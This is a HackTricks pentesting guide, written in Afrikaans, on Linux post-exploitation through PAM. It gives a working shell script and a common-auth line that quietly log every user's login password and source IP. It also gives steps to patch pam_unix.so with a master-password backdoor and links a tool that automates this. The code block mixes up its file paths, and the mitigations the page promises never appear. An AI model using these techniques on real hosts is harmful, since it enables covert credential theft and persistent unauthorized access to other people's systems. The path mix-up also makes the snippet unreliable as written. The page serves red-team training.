# Linux Na-Exploitasie

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy in HackTricks wil adverteer** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>

## Sniffing Aanteken Wagwoorde met PAM

Laat ons 'n PAM-module konfigureer om elke wagwoord wat elke gebruiker gebruik om in te teken, te registreer. As jy nie weet wat PAM is nie, kyk na:

{% content-ref url="pam-pluggable-authentication-modules.md" %}
[pam-pluggable-authentication-modules.md](pam-pluggable-authentication-modules.md)
{% endcontent-ref %}

**Vir verdere besonderhede, kyk na die [oorspronklike pos](https://embracethered.com/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/)**. Hierdie is net 'n opsomming:

**Tegniek-oorsig:**
Pluggable Authentication Modules (PAM) bied buigsaamheid in die bestuur van outentisering op Unix-gebaseerde stelsels. Hulle kan sekuriteit verbeter deur die aanpassing van intekenprosesse, maar hulle kan ook risiko's inhou as dit verkeerd gebruik word. Hierdie opsomming gee 'n tegniek om intekenbewyse vas te vang deur PAM te gebruik, tesame met mitigasie-strategie√´.

**Vaslegging van Bewyse:**
- 'n Bash-skripsie met die naam `toomanysecrets.sh` word geskep om intekenpogings te registreer, deur die datum, gebruikersnaam (`$PAM_USER`), wagwoord (via stdin) en afgele√´ gasheer-IP (`$PAM_RHOST`) na `/var/log/toomanysecrets.log` te vas te l√™.
- Die skripsie word uitvoerbaar gemaak en ge√Øntegreer in die PAM-konfigurasie (`common-auth`) deur die `pam_exec.so`-module te gebruik met opsies om stil te loop en die outentiserings-token aan die skripsie bloot te stel.
- Die benadering demonstreer hoe 'n gekompromitteerde Linux-gasheer uitgebuit kan word om bewyse heimlik te registreer.
```bash
#!/bin/sh
echo " $(date) $PAM_USER, $(cat -), From: $PAM_RHOST" >> /var/log/toomanysecrets.log
sudo touch /var/log/toomanysecrets.sh
sudo chmod 770 /var/log/toomanysecrets.sh
sudo nano /etc/pam.d/common-auth
# Add: auth optional pam_exec.so quiet expose_authtok /usr/local/bin/toomanysecrets.sh
sudo chmod 700 /usr/local/bin/toomanysecrets.sh
```
### Backdooring PAM

**Vir verdere besonderhede, kyk na die [oorspronklike pos](https://infosecwriteups.com/creating-a-backdoor-in-pam-in-5-line-of-code-e23e99579cd9)**. Hierdie is net 'n opsomming:

Die Pluggable Authentication Module (PAM) is 'n stelsel wat onder Linux gebruik word vir gebruikersverifikasie. Dit werk op drie hoofkonsepte: **gebruikersnaam**, **wagwoord**, en **diens**. Konfigurasie l√™ers vir elke diens is gele√´ in die `/etc/pam.d/` gids, waar gedeelde biblioteke verifikasie hanteer.

**Doel**: Wysig PAM om verifikasie met 'n spesifieke wagwoord toe te laat, terwyl die werklike gebruikerswagwoord omseil word. Dit is veral gefokus op die `pam_unix.so` gedeelde biblioteek wat deur die `common-auth` l√™er gebruik word, wat deur byna alle dienste vir wagwoordverifikasie ingesluit word.

### Stappe om `pam_unix.so` te wysig:

1. **Vind die Verifikasie Direktief** in die `common-auth` l√™er:
- Die lyn wat verantwoordelik is vir die kontrole van 'n gebruiker se wagwoord roep `pam_unix.so` aan.
2. **Wysig Bronkode**:
- Voeg 'n voorwaardelike verklaring by in die `pam_unix_auth.c` bronl√™er wat toegang verleen as 'n voorafbepaalde wagwoord gebruik word, anders gaan dit voort met die normale verifikasieproses.
3. **Herstel en Vervang** die gewysigde `pam_unix.so` biblioteek in die toepaslike gids.
4. **Toetsing**:
- Toegang word verleen oor verskeie dienste (aanmelding, ssh, sudo, su, skermbeveiliging) met die voorafbepaalde wagwoord, terwyl normale verifikasieprosesse onveranderd bly.

{% hint style="info" %}
Hierdie proses kan outomaties uitgevoer word met [https://github.com/zephrax/linux-pam-backdoor](https://github.com/zephrax/linux-pam-backdoor)
{% endhint %}

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks-uitrusting**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
